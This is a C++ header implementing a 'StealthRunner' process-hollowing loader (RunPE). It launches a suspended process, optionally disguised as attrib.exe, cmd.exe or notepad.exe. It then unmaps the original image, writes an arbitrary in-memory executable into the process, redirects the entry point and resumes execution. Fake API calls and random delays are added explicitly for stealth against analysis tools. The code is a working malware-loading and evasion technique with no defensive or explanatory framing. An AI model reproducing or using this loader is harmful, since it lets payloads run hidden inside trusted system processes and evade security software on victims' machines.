#pragma once

#define WIN32_LEAN_AND_MEAN
#include <Windows.h>
#include <winternl.h>
#include <TlHelp32.h>
#include <string>
#include <random>

extern "C" {
    NTSTATUS NTAPI NtUnmapViewOfSection(
        _In_ HANDLE ProcessHandle,
        _In_ PVOID BaseAddress
    );
}

class StealthRunner {
private:
    static void AddFakeAPICalls() {
        SYSTEMTIME st;
        GetSystemTime(&st);
        OSVERSIONINFOEX osvi = { 0 };
        osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
        GetVersionEx((OSVERSIONINFO*)&osvi);
        DWORD pid = GetCurrentProcessId();
        DWORD ticks = GetTickCount();
        GetCurrentThreadId();
    }

    static void RandomDelay() {
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dist(1, 50);
        Sleep(dist(gen));
    }

    static int GetRandom(int min, int max) {
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dist(min, max);
        return dist(gen);
    }

    static NTSTATUS SafeNtUnmapViewOfSection(HANDLE ProcessHandle, PVOID BaseAddress) {
        typedef NTSTATUS(NTAPI* pNtUnmapViewOfSection)(HANDLE, PVOID);

        static pNtUnmapViewOfSection pNtUnmap = nullptr;
        if (pNtUnmap == nullptr) {
            HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
            if (hNtdll) {
                pNtUnmap = (pNtUnmapViewOfSection)GetProcAddress(hNtdll, "NtUnmapViewOfSection");
            }
        }

        if (pNtUnmap) {
            return pNtUnmap(ProcessHandle, BaseAddress);
        }

        return STATUS_PROCEDURE_NOT_FOUND;
    }

public:
    static int Execute(void* Image, bool stealth = false) {
        AddFakeAPICalls();
        RandomDelay();

        IMAGE_DOS_HEADER* DOSHeader = (IMAGE_DOS_HEADER*)Image;
        if (DOSHeader->e_magic != IMAGE_DOS_SIGNATURE) {
            return 0;
        }

        IMAGE_NT_HEADERS* NTHeader = (IMAGE_NT_HEADERS*)((BYTE*)Image + DOSHeader->e_lfanew);
        if (NTHeader->Signature != IMAGE_NT_SIGNATURE) {
            return 0;
        }

        char path[MAX_PATH] = { 0 };
        GetModuleFileNameA(nullptr, path, MAX_PATH);

        if (stealth) {
            const char* systemPaths[] = {
                "C:\\Windows\\System32\\attrib.exe",
                "C:\\Windows\\System32\\cmd.exe",
                "C:\\Windows\\System32\\notepad.exe"
            };
            strcpy_s(path, MAX_PATH, systemPaths[GetRandom(0, 2)]);
        }

        PROCESS_INFORMATION PI = { 0 };
        STARTUPINFOA SI = { 0 };
        SI.cb = sizeof(SI);

        if (CreateProcessA(path, nullptr, nullptr, nullptr, FALSE,
            CREATE_SUSPENDED | CREATE_NO_WINDOW, nullptr, nullptr, &SI, &PI)) {

            CONTEXT ctx = { 0 };
            ctx.ContextFlags = CONTEXT_FULL;

            if (GetThreadContext(PI.hThread, &ctx)) {
                PVOID imageBase = nullptr;
                SIZE_T bytesRead = 0;

#if defined(_WIN64)
                ReadProcessMemory(PI.hProcess, (LPCVOID)(ctx.Rdx + 0x10), &imageBase, sizeof(imageBase), &bytesRead);
#else
                ReadProcessMemory(PI.hProcess, (LPCVOID)(ctx.Ebx + 0x8), &imageBase, sizeof(imageBase), &bytesRead);
#endif

                if (imageBase != nullptr) {
                    SafeNtUnmapViewOfSection(PI.hProcess, imageBase);
                }

                PVOID newImageBase = VirtualAllocEx(PI.hProcess,
                    (PVOID)NTHeader->OptionalHeader.ImageBase,
                    NTHeader->OptionalHeader.SizeOfImage,
                    MEM_COMMIT | MEM_RESERVE,
                    PAGE_EXECUTE_READWRITE);

                if (newImageBase == nullptr) {
                    newImageBase = VirtualAllocEx(PI.hProcess, nullptr,
                        NTHeader->OptionalHeader.SizeOfImage,
                        MEM_COMMIT | MEM_RESERVE,
                        PAGE_EXECUTE_READWRITE);
                }

                if (newImageBase != nullptr) {
                    // Write headers
                    WriteProcessMemory(PI.hProcess, newImageBase, Image,
                        NTHeader->OptionalHeader.SizeOfHeaders, nullptr);

                    // Write sections
                    IMAGE_SECTION_HEADER* sectionHeader = IMAGE_FIRST_SECTION(NTHeader);
                    for (WORD i = 0; i < NTHeader->FileHeader.NumberOfSections; i++) {
                        WriteProcessMemory(PI.hProcess,
                            (LPVOID)((BYTE*)newImageBase + sectionHeader[i].VirtualAddress),
                            (LPVOID)((BYTE*)Image + sectionHeader[i].PointerToRawData),
                            sectionHeader[i].SizeOfRawData, nullptr);
                    }

                    // Update image base in PEB
#if defined(_WIN64)
                    WriteProcessMemory(PI.hProcess, (LPVOID)(ctx.Rdx + 0x10),
                        &newImageBase, sizeof(newImageBase), nullptr);
                    ctx.Rax = (DWORD_PTR)newImageBase + NTHeader->OptionalHeader.AddressOfEntryPoint;
#else
                    DWORD imageBaseValue = (DWORD)newImageBase;
                    WriteProcessMemory(PI.hProcess, (LPVOID)(ctx.Ebx + 0x8),
                        &imageBaseValue, sizeof(imageBaseValue), nullptr);
                    ctx.Eax = (DWORD)newImageBase + NTHeader->OptionalHeader.AddressOfEntryPoint;
#endif

                    SetThreadContext(PI.hThread, &ctx);

                    // Add random delays for stealth
                    for (int i = 0; i < 3; i++) {
                        RandomDelay();
                    }

                    ResumeThread(PI.hThread);

                    // Wait for process to complete
                    WaitForSingleObject(PI.hProcess, INFINITE);

                    // Get exit code
                    DWORD exitCode = 0;
                    GetExitCodeProcess(PI.hProcess, &exitCode);

                    CloseHandle(PI.hThread);
                    CloseHandle(PI.hProcess);

                    return (int)exitCode;
                }
            }
            CloseHandle(PI.hThread);
            CloseHandle(PI.hProcess);
        }
        return 0;
    }
};

// Alias for compatibility
inline int RunPortableExecutable(void* Image, bool stealth = false) {
    return StealthRunner::Execute(Image, stealth);
}
//atyonekilla